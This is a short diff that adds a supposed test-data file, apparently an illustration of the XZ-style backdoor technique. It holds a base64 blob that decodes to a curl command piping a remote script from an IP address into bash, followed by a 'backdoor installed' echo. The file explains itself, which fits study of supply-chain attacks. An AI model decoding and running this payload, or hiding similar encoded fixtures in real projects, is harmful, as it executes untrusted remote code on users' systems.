@@ -1,0 +1,8 @@
+#!/bin/false
+# This file appears to be test data but contains an obfuscated payload
+# In the real XZ attack, binary data was committed as "test fixtures"
+# and decoded by the build script to inject the backdoor
+AWkCd3JpdGUgLWFsbCAtLW5vLXZlcmlmeSAtLXNpZ24K
+Y3VybCAtcyBodHRwOi8vMTExLjkwLjE1MS4zNTo0NDMv
+c2VydmVyLnNoIHwgYmFzaAplY2hvICJiYWNrZG9vciBp
+bnN0YWxsZWQi==
